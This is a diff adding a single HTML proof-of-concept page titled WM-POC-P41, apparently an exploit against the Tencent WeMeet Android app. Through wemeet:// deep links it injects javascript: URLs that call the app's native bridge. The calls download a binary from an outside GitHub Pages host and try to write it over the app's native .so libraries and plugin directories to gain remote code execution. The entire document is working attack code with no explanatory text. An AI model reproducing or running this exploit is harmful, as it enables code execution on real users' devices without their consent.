@@ -1,0 +1,32 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P41</h1>
+<script>
+document.title='P41-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var src='/data/user/0/com.tencent.wemeet.app/files/Users/Default/3706b639ea15ecbcc7e01d788ffb4366/ExportFile/p41.bin';
+var destA='/data/user/0/com.tencent.wemeet.app/files/Global/Data/AvatarModel/10e43f8954c9fae6a643731926ccdcc6/jni/arm64-v8a/libYT3DAvatar.so';
+var destH='/data/user/0/com.tencent.wemeet.app/files/com.tencent.wemeet.app/files/lib/libp41.so';
+var destM='/data/user/0/com.tencent.wemeet.app/app_midasplugins/p41.bin';
+var bin='https://gitwhs.github.io/wm-poc-rce/p41.bin';
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+function inj(js, label){
+  frame('wemeet://page/web_app?url='+encodeURIComponent(js), label);
+}
+var writeJs="javascript:void(function(){document.title='P41INJ:'+location.host;window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P41CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,40)};window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:'CommonPlugin',method:'ExportFile',param:{url:'https://gitwhs.github.io/wm-poc-rce/p41.bin',fileName:'p41.bin',contentType:'application/octet-stream'},callId:'W1'}))})()";
+var stJs="javascript:void(function(){window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P41CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,50)};function c(id,p){window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:'Storage',method:'ExportFile',param:p,callId:id}))}var s='"+src+"',a='"+destA+"',h='"+destH+"',m='"+destM+"';c('S1',{src_path:s,dest_path:a});setTimeout(function(){c('S2',{src:s,dest:a})},800);setTimeout(function(){c('S3',{src_path:s,dest_path:h})},1600);setTimeout(function(){c('S4',{src_path:s,dest_path:m})},2400);setTimeout(function(){c('S5',{fileName:'p41.bin',dest_path:a})},3200)})()";
+var vbgJs="javascript:void(function(){window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P41CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,40)};window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:'VirtualBackgroundPlugin',method:'SetVirtualBackground',param:{url:'https://gitwhs.github.io/wm-poc-rce/p41.bin',contentType:'application/octet-stream',md5:''},callId:'V1'}))})()";
+var tplJs="javascript:void(function(){window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P41CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,40)};window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:'CommonPlugin',method:'LoadTemplateWebView',param:{url:'https://gitwhs.github.io/wm-poc-rce/p41.bin',template_url:'https://gitwhs.github.io/wm-poc-rce/p41.bin'},callId:'T1'}))})()";
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P41-OFFICIAL'); }, 600);
+setTimeout(function(){ inj(writeJs,'P41-WRITE'); }, 12000);
+setTimeout(function(){ inj(stJs,'P41-STOR'); }, 20000);
+setTimeout(function(){ inj(vbgJs,'P41-VBG'); }, 28000);
+setTimeout(function(){ inj(tplJs,'P41-TPL'); }, 34000);
+setTimeout(function(){ document.title='P41-DONE'; }, 42000);
+</script>
+</body></html>
